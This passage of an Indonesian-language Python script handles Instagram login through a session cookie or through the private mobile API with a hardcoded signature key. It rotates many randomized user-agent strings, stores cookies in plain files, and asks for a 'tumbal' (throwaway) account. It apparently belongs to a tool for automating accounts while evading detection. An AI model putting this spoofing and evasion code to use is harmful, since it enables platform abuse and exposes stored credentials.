EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (iPad; CPU OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15{random.choice([f' GNews iOS/5.74.201',f' QBWebViewUA/2 QBWebViewType/1 WKType/1',''])}",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(10,20))}.0 Safari/605.1.15{random.choice([f' GNews iOS/5.74.201',f' QBWebViewUA/2 QBWebViewType/1 WKType/1',''])}",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/115 Mobile/15E148 Safari/605.1.15",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(10,20))}.0 MQQBrowser/14.7.6 Mobile/15E148 Safari/604.1",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/122.0.2365.9 Version/{str(random.randint(10,20))}.0 Mobile/15E148 Safari/604.1",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}) AppleWebKit/583.3 (KHTML, like Gecko) Chrome/{e}.{f}.{g}.{h} Safari/583.3 {random.choice([f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',''])}",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}; en-US) AppleWebKit/603.7.5 (KHTML, like Gecko) Version/13.0.3 Safari/603.7.5",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; 5030D_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice([f' OppoBrowser/{str(random.randint(1,25))}.{str(random.randint(1,9))}.0.{str(random.randint(1,9))}',f' RealmeBrowser/{str(random.randint(10,39))}.{str(random.randint(1,9))}.0.{str(random.randint(1,9))}',f' HeyTapBrowser/{str(random.randint(6,49))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}'])}",
		f"Mozilla/5.0 (Linux; Android {a}; M2004J19C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36 Puffin/8.3.1.41624AP",
		f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}"
	])
	return z
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Login Harap Tunggu....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
try:
    urllib_quote_plus = urllib.quote
except:
    urllib_quote_plus = urllib.parse.quote_plus
def li():
    clear()
    up=f"""[green]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                            [/green]"""
    ui=nel(up,style='green')
    sol().print(ui)	
def lu():
	clear()
	up=f"""[red]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                                                                                                                   [/red]
"""
	sol().print(nel(up, style=''))
def cekAPI(cookie):
    user=open('.username','r').read()
    coki = open('.kukis.log','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    except  (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError):
        wel='• Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user
def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            prints(Panel(f'\t           {P2}Login menggunakan cookie instagram[/]',padding=(0,2),style=f"{color_table}"))
            coki = input(f"• Masukan Cookie : {H}")
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)["user"]
                nama = xx["full_name"]
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                prints(Panel(f"        selamat [green]{nama}[/] cookie kamu valid", padding=(0,5), style=f"{color_table}", width=80));time.sleep(2);time.sleep(2);exit(f"[{M}!{N}] Jalankan ulang perintah nya")
            except (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
                print("")
                loadinglogin();time.sleep(4)
                exit(f'{M} [x] Login gagal silahkan cek akun tumbal anda');time.sleep(8)
            except ConnectionAbortedError:
                exit(f'{merah}Tidak ada koneksi internet')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:register_device()
def login():
	global external
	try:
		wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		us=input(f"{N}[•] Masukan username: {N}")
		pw=stdiomask.getpass(prompt=f'{N}[•] Masukan password: {N}')
	except KeyboardInterrupt:
		wel = '# KeyboardInterrupt terdeteksi... keluar !'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		exit()
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print(f'\n{H}>{C} Login berhasil')
		os.system('python run.py')
	elif x.get('status')=='checkpoint':
		wel = '# Login checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
	else:
		wel = '# Username atau password yang anda masukan salah'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'X104','ColorTab 816i','NG3128HD'
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus','Lenovo']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (28/9; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; Redmi Note 8; '+random.choice(model_phone)+'; ginkgo; qcom; ru_RU'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100','SM-G935T']
	dpis = ['120', '160', '320', '240','560']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; qcom; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'
	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()
	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]
	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')
	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
